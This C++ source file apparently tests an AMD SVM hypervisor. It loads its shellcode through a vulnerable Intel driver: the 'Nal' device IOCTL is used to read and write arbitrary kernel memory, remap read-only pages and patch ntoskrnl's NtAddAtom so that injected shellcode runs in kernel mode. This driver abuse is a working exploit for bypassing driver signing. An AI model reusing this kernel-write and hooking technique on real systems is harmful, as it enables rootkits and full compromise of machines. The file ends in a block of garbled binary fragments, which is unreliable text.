÷Â// SVMHypervisorV5_8.cpp
// Step 5.8 SAFE: Two VMRUNs (linear, no loop)
// 1. First VMRUN -> CPUID VMEXIT
// 2. Advance RIP by 2
// 3. Second VMRUN -> CPUID VMEXIT
// 4. Exit cleanly
//
// NO LOOP - just linear code to prove RIP advance works

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007

typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool WriteMemory(uint64_t address, void *buffer, uint64_t size) {
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(address, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;
  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;
  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0)
    return false;
  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr)
    return false;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);
  return result;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;
  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }
  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;
  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;
  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;
  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;
  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;
  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }
  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;
  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }
  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);
  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;
    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }
  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];

template <typename RetType, typename... Args>
bool CallKernelFunction(RetType *outResult, uint64_t targetFuncAddr,
                        Args... args) {
  if (!targetFuncAddr || !kernelNtAddAtom)
    return false;
  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function)))
    return false;
  if (original_kernel_function[0] == 0x48 &&
      original_kernel_function[1] == 0xb8)
    return false;
  uint8_t jmpHook[sizeof(kernel_injected_jmp)];
  memcpy(jmpHook, kernel_injected_jmp, sizeof(jmpHook));
  *(uint64_t *)&jmpHook[2] = targetFuncAddr;
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, jmpHook, sizeof(jmpHook)))
    return false;
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomPtr = reinterpret_cast<RetType(__stdcall *)(Args...)>(
      GetProcAddress(ntdll, "NtAddAtom"));
  RetType result = NtAddAtomPtr(args...);
  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));
  if (outResult)
    *outResult = result;
  return true;
}

// ==================== V5.8 SAFE Shellcode ====================
// Linear execution - NO LOOPS:
// 1. Setup VMCB (same as V5.7)
// 2. First VMRUN -> CPUID VMEXIT
// 3. Advance RIP by 2
// 4. Clear exit code
// 5. Second VMRUN -> CPUID VMEXIT
// 6. Return with exit code in EAX

uint8_t v5_8Shellcode[] = {
    // ===== Prologue - Save ALL host GPRs =====
    0x55, // push rbp           ; 0
    0x48,
    0x89,
    0xE5, // mov rbp, rsp       ; 1-3
    0x50, // push rax           ; 4
    0x51, // push rcx           ; 5
    0x52, // push rdx           ; 6
    0x53, // push rbx           ; 7
    0x56, // push rsi           ; 8
    0x57, // push rdi           ; 9
    0x41,
    0x50, // push r8            ; 10-11
    0x41,
    0x51, // push r9            ; 12-13
    0x41,
    0x52, // push r10           ; 14-15
    0x41,
    0x53, // push r11           ; 16-17
    // Total prologue: 18 bytes

    // ===== Step 1: Enable EFER.SVME =====
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0, // mov ecx, 0xC0000080 ; 18-22
    0x0F,
    0x32, // rdmsr               ; 23-24
    0x0D,
    0x00,
    0x10,
    0x00,
    0x00, // or eax, 0x1000      ; 25-29
    0x0F,
    0x30, // wrmsr               ; 30-31

    // ===== Step 2: Write VM_HSAVE_PA MSR =====
    0xB9,
    0x17,
    0x01,
    0x01,
    0xC0, // mov ecx, 0xC0010117 ; 32-36
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00, // mov eax, low  @38   ; 37-41
    0xBA,
    0x00,
    0x00,
    0x00,
    0x00, // mov edx, high @43   ; 42-46
    0x0F,
    0x30, // wrmsr               ; 47-48

    // ===== Step 3: Load VMCB_PA into RAX =====
    0x48,
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov rax, vmcb_pa @51 ; 49-58

    // ===== Step 4: VMSAVE to capture hidden state =====
    0x0F,
    0x01,
    0xDB, // vmsave rax          ; 59-61

    // ===== Step 5: Load VMCB_VA into RBX (keep for duration) =====
    0x48,
    0xBB,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov rbx, vmcb_va @64 ; 62-71

    // ===== Steps 6-16: Populate VMCB (same as V5.7) =====
    // CR0
    0x0F,
    0x20,
    0xC0, // mov rax, cr0
    0x48,
    0x89,
    0x83,
    0x58,
    0x05,
    0x00,
    0x00, // mov [rbx+0x558], rax
    // CR3
    0x0F,
    0x20,
    0xD8, // mov rax, cr3
    0x48,
    0x89,
    0x83,
    0x50,
    0x05,
    0x00,
    0x00, // mov [rbx+0x550], rax
    // CR4
    0x0F,
    0x20,
    0xE0, // mov rax, cr4
    0x48,
    0x89,
    0x83,
    0x48,
    0x05,
    0x00,
    0x00, // mov [rbx+0x548], rax
    // EFER
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0, // mov ecx, 0xC0000080
    0x0F,
    0x32, // rdmsr
    0x48,
    0xC1,
    0xE2,
    0x20, // shl rdx, 32
    0x48,
    0x09,
    0xD0, // or rax, rdx
    0x48,
    0x89,
    0x83,
    0xD0,
    0x04,
    0x00,
    0x00, // mov [rbx+0x4D0], rax
    // GDTR
    0x48,
    0x83,
    0xEC,
    0x10, // sub rsp, 16
    0x0F,
    0x01,
    0x04,
    0x24, // sgdt [rsp]
    0x0F,
    0xB7,
    0x04,
    0x24, // movzx eax, word [rsp]
    0x89,
    0x83,
    0x64,
    0x04,
    0x00,
    0x00, // mov [rbx+0x464], eax
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02, // mov rax, [rsp+2]
    0x48,
    0x89,
    0x83,
    0x68,
    0x04,
    0x00,
    0x00, // mov [rbx+0x468], rax
    // IDTR
    0x0F,
    0x01,
    0x0C,
    0x24, // sidt [rsp]
    0x0F,
    0xB7,
    0x04,
    0x24, // movzx eax, word [rsp]
    0x89,
    0x83,
    0x84,
    0x04,
    0x00,
    0x00, // mov [rbx+0x484], eax
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02, // mov rax, [rsp+2]
    0x48,
    0x89,
    0x83,
    0x88,
    0x04,
    0x00,
    0x00, // mov [rbx+0x488], rax
    0x48,
    0x83,
    0xC4,
    0x10, // add rsp, 16
    // Segment selectors
    0x8C,
    0xC8, // mov ax, cs
    0x66,
    0x89,
    0x83,
    0x10,
    0x04,
    0x00,
    0x00, // mov [rbx+0x410], ax
    0x8C,
    0xD0, // mov ax, ss
    0x66,
    0x89,
    0x83,
    0x20,
    0x04,
    0x00,
    0x00, // mov [rbx+0x420], ax
    0x8C,
    0xD8, // mov ax, ds
    0x66,
    0x89,
    0x83,
    0x30,
    0x04,
    0x00,
    0x00, // mov [rbx+0x430], ax
    0x8C,
    0xC0, // mov ax, es
    0x66,
    0x89,
    0x83,
    0x00,
    0x04,
    0x00,
    0x00, // mov [rbx+0x400], ax
    // Segment limits (0xFFFFFFFF)
    0xB8,
    0xFF,
    0xFF,
    0xFF,
    0xFF, // mov eax, 0xFFFFFFFF
    0x89,
    0x83,
    0x04,
    0x04,
    0x00,
    0x00, // mov [rbx+0x404], eax
    0x89,
    0x83,
    0x14,
    0x04,
    0x00,
    0x00, // mov [rbx+0x414], eax
    0x89,
    0x83,
    0x24,
    0x04,
    0x00,
    0x00, // mov [rbx+0x424], eax
    0x89,
    0x83,
    0x34,
    0x04,
    0x00,
    0x00, // mov [rbx+0x434], eax
    // Segment attributes
    0x66,
    0xC7,
    0x83,
    0x12,
    0x04,
    0x00,
    0x00,
    0x9B,
    0x02, // CS = 0x029B
    0x66,
    0xC7,
    0x83,
    0x22,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // SS = 0x0093
    0x66,
    0xC7,
    0x83,
    0x32,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // DS = 0x0093
    0x66,
    0xC7,
    0x83,
    0x02,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // ES = 0x0093
    // RFLAGS
    0x9C, // pushfq
    0x58, // pop rax
    0x48,
    0x89,
    0x83,
    0x70,
    0x05,
    0x00,
    0x00, // mov [rbx+0x570], rax
    // RSP
    0x48,
    0x89,
    0xE0, // mov rax, rsp
    0x48,
    0x89,
    0x83,
    0xD8,
    0x05,
    0x00,
    0x00, // mov [rbx+0x5D8], rax

    // ===== Set ASID = 1 =====
    0xC7,
    0x43,
    0x58,
    0x01,
    0x00,
    0x00,
    0x00, // mov dword [rbx+0x58], 1

    // ===== Set intercepts (CPUID + VMRUN) =====
    0xC7,
    0x43,
    0x0C,
    0x00,
    0x00,
    0x04,
    0x00, // mov dword [rbx+0x0C], 0x40000 (CPUID)
    0xC7,
    0x43,
    0x10,
    0x01,
    0x00,
    0x00,
    0x00, // mov dword [rbx+0x10], 1 (VMRUN)

    // ===== Set guest RIP = address of first CPUID =====
    0x48,
    0x8D,
    0x05,
    0x00,
    0x00,
    0x00,
    0x00, // lea rax, [rip+XX] @LEA_DISP1
    0x48,
    0x89,
    0x83,
    0x78,
    0x05,
    0x00,
    0x00, // mov [rbx+0x578], rax

    // ===== Set guest RAX = VMCB_PA =====
    0x48,
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov rax, vmcb_pa @GUEST_RAX1
    0x48,
    0x89,
    0x83,
    0xF8,
    0x05,
    0x00,
    0x00, // mov [rbx+0x5F8], rax

    // ===== Store VMEXIT counter in RSI =====
    0x31,
    0xF6, // xor esi, esi  ; counter = 0

    // ==================== FIRST VMRUN ====================
    0xFA, // cli
    0x0F,
    0x01,
    0xDA, // vmload rax
    0x0F,
    0x01,
    0xD8, // vmrun rax
    // ===== VMEXIT 1 returns here =====
    0x0F,
    0x01,
    0xDB, // vmsave rax
    0x0F,
    0x01,
    0xDC, // stgi
    0xFB, // sti
    0xFF,
    0xC6, // inc esi  ; counter = 1

    // ===== Store first exit code in EDI =====
    0x8B,
    0x7B,
    0x70, // mov edi, [rbx+0x70]

    // ===== Advance guest RIP by 2 (skip CPUID) =====
    0x48,
    0x8B,
    0x83,
    0x78,
    0x05,
    0x00,
    0x00, // mov rax, [rbx+0x578]
    0x48,
    0x83,
    0xC0,
    0x02, // add rax, 2
    0x48,
    0x89,
    0x83,
    0x78,
    0x05,
    0x00,
    0x00, // mov [rbx+0x578], rax

    // ===== Clear exit code for clean second run =====
    0xC7,
    0x43,
    0x70,
    0x00,
    0x00,
    0x00,
    0x00, // mov dword [rbx+0x70], 0

    // ===== Reload VMCB_PA into RAX =====
    0x48,
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov rax, vmcb_pa @VMCB_PA2

    // ==================== SECOND VMRUN ====================
    0xFA, // cli
    0x0F,
    0x01,
    0xDA, // vmload rax
    0x0F,
    0x01,
    0xD8, // vmrun rax
    // ===== VMEXIT 2 returns here =====
    0x0F,
    0x01,
    0xDB, // vmsave rax
    0x0F,
    0x01,
    0xDC, // stgi
    0xFB, // sti
    0xFF,
    0xC6, // inc esi  ; counter = 2

    // ===== Store second exit code in R8D =====
    0x44,
    0x8B,
    0x43,
    0x70, // mov r8d, [rbx+0x70]

    // ===== Return: EAX = (exit1 << 8) | counter =====
    0x89,
    0xF8, // mov eax, edi  ; first exit code
    0xC1,
    0xE0,
    0x10, // shl eax, 16
    0x44,
    0x09,
    0xC0, // or eax, r8d   ; second exit code in low 16 bits
    // Now eax = (exit1 << 16) | exit2

    // ===== Epilogue - Restore ALL host GPRs =====
    0x41,
    0x5B, // pop r11
    0x41,
    0x5A, // pop r10
    0x41,
    0x59, // pop r9
    0x41,
    0x58, // pop r8
    0x5F, // pop rdi
    0x5E, // pop rsi
    0x5B, // pop rbx
    0x5A, // pop rdx
    0x59, // pop rcx
    0x48,
    0x83,
    0xC4,
    0x08, // add rsp, 8 (skip saved rax)
    0x5D, // pop rbp
    0xC3, // ret

    // ===== Guest code: Two CPUIDs =====
    0x0F,
    0xA2, // cpuid (1st) - will VMEXIT
    0x0F,
    0xA2, // cpuid (2nd) - will VMEXIT after RIP advance
};

int main() {
  printf("================================================================\n");
  printf("       SVM HYPERVISOR V5.8 SAFE - Two VMRUNs (Linear)          \n");
  printf("    First VMRUN -> CPUID -> Advance RIP -> Second VMRUN        \n");
  printf(
      "================================================================\n\n");

  // Calculate offsets dynamically
  printf("[*] Calculating shellcode offsets...\n");

  size_t OFF_HSAVE_LOW = 0, OFF_HSAVE_HIGH = 0;
  size_t OFF_VMCB_PA1 = 0, OFF_VMCB_VA = 0;
  size_t OFF_LEA_DISP1 = 0, OFF_GUEST_RAX1 = 0, OFF_VMCB_PA2 = 0;
  size_t LOC_GUEST_CODE = 0;

  // Find HSAVE patches (B8 followed by BA)
  for (size_t i = 0; i < sizeof(v5_8Shellcode) - 10; i++) {
    if (v5_8Shellcode[i] == 0xB8 && v5_8Shellcode[i + 5] == 0xBA &&
        OFF_HSAVE_LOW == 0) {
      OFF_HSAVE_LOW = i + 1;
      OFF_HSAVE_HIGH = i + 6;
      break;
    }
  }

  // Find mov rax, imm64 (48 B8) - there are multiple
  int movRaxCount = 0;
  for (size_t i = 0; i < sizeof(v5_8Shellcode) - 10; i++) {
    if (v5_8Shellcode[i] == 0x48 && v5_8Shellcode[i + 1] == 0xB8) {
      movRaxCount++;
      if (movRaxCount == 1)
        OFF_VMCB_PA1 = i + 2;
      if (movRaxCount == 2)
        OFF_GUEST_RAX1 = i + 2;
      if (movRaxCount == 3)
        OFF_VMCB_PA2 = i + 2;
    }
  }

  // Find mov rbx, imm64 (48 BB) - VMCB_VA
  for (size_t i = 0; i < sizeof(v5_8Shellcode) - 10; i++) {
    if (v5_8Shellcode[i] == 0x48 && v5_8Shellcode[i + 1] == 0xBB) {
      OFF_VMCB_VA = i + 2;
      break;
    }
  }

  // Find LEA (48 8D 05)
  for (size_t i = 0; i < sizeof(v5_8Shellcode) - 10; i++) {
    if (v5_8Shellcode[i] == 0x48 && v5_8Shellcode[i + 1] == 0x8D &&
        v5_8Shellcode[i + 2] == 0x05) {
      OFF_LEA_DISP1 = i + 3;
      break;
    }
  }

  // Guest code is at the very end (2 CPUIDs = 4 bytes)
  LOC_GUEST_CODE = sizeof(v5_8Shellcode) - 4;

  printf("    HSAVE: LOW=%zu, HIGH=%zu\n", OFF_HSAVE_LOW, OFF_HSAVE_HIGH);
  printf("    VMCB_PA1=%zu, VMCB_VA=%zu\n", OFF_VMCB_PA1, OFF_VMCB_VA);
  printf("    GUEST_RAX=%zu, VMCB_PA2=%zu\n", OFF_GUEST_RAX1, OFF_VMCB_PA2);
  printf("    LEA_DISP=%zu, GUEST_CODE=%zu\n", OFF_LEA_DISP1, LOC_GUEST_CODE);
  printf("    Total shellcode: %zu bytes\n\n", sizeof(v5_8Shellcode));

  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  uint64_t kernelExAllocatePool =
      GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");

  // Allocate memory
  uint64_t allocatedAddr = 0;
  CallKernelFunction<uint64_t>(&allocatedAddr, kernelExAllocatePool, 0, 0x2000,
                               0x484D5653);
  if (!allocatedAddr) {
    printf("[-] Allocation failed!\n");
    return 1;
  }

  uint64_t vmcbVa = allocatedAddr;
  uint64_t hsaveVa = allocatedAddr + 0x1000;
  uint64_t vmcbPa = 0, hsavePa = 0;
  GetPhysicalAddress(vmcbVa, &vmcbPa);
  GetPhysicalAddress(hsaveVa, &hsavePa);
  printf("[+] VMCB VA: 0x%llX PA: 0x%llX\n", vmcbVa, vmcbPa);
  printf("[+] HSAVE VA: 0x%llX PA: 0x%llX\n", hsaveVa, hsavePa);

  // Zero memory
  uint8_t zeros[0x1000] = {0};
  WriteMemory(vmcbVa, zeros, 0x1000);
  WriteMemory(hsaveVa, zeros, 0x1000);

  // Patch shellcode
  uint8_t patched[sizeof(v5_8Shellcode)];
  memcpy(patched, v5_8Shellcode, sizeof(patched));

  *(uint32_t *)&patched[OFF_HSAVE_LOW] = (uint32_t)(hsavePa & 0xFFFFFFFF);
  *(uint32_t *)&patched[OFF_HSAVE_HIGH] =
      (uint32_t)((hsavePa >> 32) & 0xFFFFFFFF);
  *(uint64_t *)&patched[OFF_VMCB_PA1] = vmcbPa;
  *(uint64_t *)&patched[OFF_VMCB_VA] = vmcbVa;
  *(uint64_t *)&patched[OFF_GUEST_RAX1] = vmcbPa;
  *(uint64_t *)&patched[OFF_VMCB_PA2] = vmcbPa;

  // Calculate LEA displacement to guest code
  int32_t leaDisp = (int32_t)(LOC_GUEST_CODE - (OFF_LEA_DISP1 + 4));
  *(int32_t *)&patched[OFF_LEA_DISP1] = leaDisp;

  printf("[+] LEA displacement: %d\n", leaDisp);
  printf("[+] Shellcode patched (%zu bytes)\n\n", sizeof(patched));

  printf("Press ENTER to execute TWO VMRUNs...\n");
  getchar();

  // Execute
  uint8_t backup[512];
  ReadMemory(kernelNtAddAtom, backup, sizeof(patched));
  WriteToReadOnlyMemory(kernelNtAddAtom, patched, sizeof(patched));

  printf("[*] Executing V5.8 (Two VMRUNs)...\n");
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomFunc = (NTSTATUS(__stdcall *)(
      void *, ULONG, PUSHORT))GetProcAddress(ntdll, "NtAddAtom");
  USHORT atom = 0;
  NTSTATUS result = NtAddAtomFunc(nullptr, 0, &atom);

  WriteToReadOnlyMemory(kernelNtAddAtom, backup, sizeof(patched));
  printf("[+] NtAddAtom restored\n\n");

  // Decode result
  uint32_t ret = (uint32_t)result;
  uint32_t exit1 = (ret >> 16) & 0xFFFF;
  uint32_t exit2 = ret & 0xFFFF;

  printf("=== VMEXIT Results ===\n");
  printf("[*] First VMEXIT code:  0x%X\n", exit1);
  printf("[*] Second VMEXIT code: 0x%X\n", exit2);

  if (exit1 == 0x72 && exit2 == 0x72) {
    printf("\n");
    printf("========================================\n");
    printf("  [+] SUCCESS! TWO VMRUNs WORKED!      \n");
    printf("  [+] RIP advance is working!          \n");
    printf("  [+] Both VMEXITs = 0x72 (CPUID)      \n");
    printf("========================================\n");
  } else {
    printf("\n");
    printf("[!] Unexpected exit codes - check VMCB\n");
  }

  CloseHandle(hDevice);
  return 0;
}
% *cascade08%**cascade08*, *cascade08,0*cascade0803 *cascade0834*cascade0845 *cascade0856*cascade0867 *cascade087:*cascade08:; *cascade08;?*cascade08?@ *cascade08@A*cascade08AC *cascade08CD*cascade08DM *cascade08MO*cascade08OP *cascade08PQ*cascade08QV *cascade08V[*cascade08[\ *cascade08\^*cascade08^e *cascade08ek*cascade08kp *cascade08pr*cascade08rt *cascade08ty*cascade08y{ *cascade08{~*cascade08~‚ *cascade08‚ƒ*cascade08ƒˆ *cascade08ˆŠ*cascade08Š‹ *cascade08‹Œ*cascade08Œ *cascade08‘*cascade08‘’ *cascade08’—*cascade08—˜ *cascade08˜š*cascade08š› *cascade08›*cascade08  *cascade08 §*cascade08§¬ *cascade08¬®*cascade08®¯ *cascade08¯²*cascade08²´ *cascade08´µ*cascade08µ¸ *cascade08¸Æ*cascade08ÆÇ *cascade08ÇÊ*cascade08ÊÌ *cascade08ÌÑ*cascade08ÑÒ *cascade08ÒØ*cascade08ØÙ *cascade08ÙÛ*cascade08ÛÜ *cascade08ÜŞ*cascade08Şâ *cascade08âã*cascade08ãä *cascade08äæ*cascade08æç *cascade08çì*cascade08ìí *cascade08íó*cascade08óô *cascade08ôù*cascade08ùëL *cascade08ëLóL*cascade08óLôL *cascade08ôLöL*cascade08öL÷L *cascade08÷LıL*cascade08ıL”M *cascade08”M–M*cascade08–M—M *cascade08—M˜M*cascade08˜M¢M *cascade08¢M£M*cascade08£M¥M *cascade08¥M¦M*cascade08¦MªM *cascade08ªM¬M*cascade08¬M­M *cascade08­M³M*cascade08³M¸M *cascade08¸MºM*cascade08ºM»M *cascade08»M¼M*cascade08¼M¾M *cascade08¾MÀM*cascade08ÀMÆM *cascade08ÆMÇM*cascade08ÇMÒM *cascade08ÒMÔM*cascade08ÔMÙM *cascade08ÙMÚM*cascade08ÚMÜM *cascade08ÜMİM*cascade08İMàM *cascade08àMáM*cascade08áMèM *cascade08èMêM*cascade08êM”N *cascade08”N•N*cascade08•N—N *cascade08—N™N*cascade08™N°N *cascade08°N²N*cascade08²N³N *cascade08³N´N*cascade08´N¼N *cascade08¼N½N*cascade08½NÆN *cascade08ÆNÈN*cascade08ÈNÉN *cascade08ÉNÊN*cascade08ÊNÏN *cascade08ÏNÑN*cascade08ÑNÓN *cascade08ÓNÕN*cascade08ÕNÖN *cascade08ÖN×N*cascade08×NÙN *cascade08ÙNÚN*cascade08ÚNÛN *cascade08ÛNİN*cascade08İNŞN *cascade08ŞNáN*cascade08áNâN *cascade08âNæN*cascade08æNèN *cascade08èNéN*cascade08éNìN *cascade08ìNíN*cascade08íNóN *cascade08óNõN*cascade08õNöN *cascade08öNøN*cascade08øNúN *cascade08úNÿN*cascade08ÿN‡O *cascade08‡O‰O*cascade08‰OŠO *cascade08ŠO‹O*cascade08‹OŒO *cascade08ŒOO*cascade08O–O *cascade08–O›O*cascade08›OœO *cascade08œOO*cascade08OO *cascade08O¢O*cascade08¢O¥O *cascade08